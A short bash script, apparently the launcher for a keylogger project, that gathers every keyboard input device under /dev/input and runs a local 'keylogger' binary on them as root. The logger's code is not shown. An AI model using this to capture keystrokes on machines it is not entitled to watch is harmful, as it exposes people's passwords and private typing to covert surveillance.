#!/usr/bin/env bash

list=$(ls -la /dev/input/by-id/*event-kbd | awk -F/ '{print "/dev/input/"$NF}')

sudo ./keylogger $list
